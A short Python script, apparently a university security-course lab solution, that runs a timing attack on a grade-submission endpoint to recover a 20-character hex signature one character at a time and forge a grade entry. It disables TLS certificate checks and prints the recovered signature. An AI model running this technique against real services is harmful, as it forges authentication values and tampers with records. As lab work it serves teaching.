import requests

requests.packages.urllib3.disable_warnings()

# An timing attack based on time consuming chrcmp function
def timing_attack(name, grade, size=20, retries=10):
  url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php'
  params = {'name': name, 'grade': grade, 'signature': ''}
  hex_string = '0123456789abcdef'
  print('Searching...')

  signature = []

  for i in range(size):
    max_char, max_t = None, 0

    for j in range(len(hex_string)):
      curr_char = hex_string[j]
      params['signature'] = ''.join(signature) + curr_char

      R = [requests.get(url, params, verify=False) for i in range(retries)]
      t = min([r.elapsed.total_seconds() for r in R])

      if(t > max_t):
        max_char, max_t = curr_char, t

    signature.append(max_char)

    print('{}/{}'.format(i+1, size), ''.join(signature))
  
  params['signature'] = ''.join(signature)
  r = requests.get(url, params, verify=False)
  print('Sign verified:', int(r.text) == 1)

  return params

if __name__ == '__main__':
  # Kalle, 5 => 6823ea50b133c58cba36
  params = timing_attack(input('Name: '), int(input('Grade: ')), retries=int(input('Retries: ')))
  print(params)
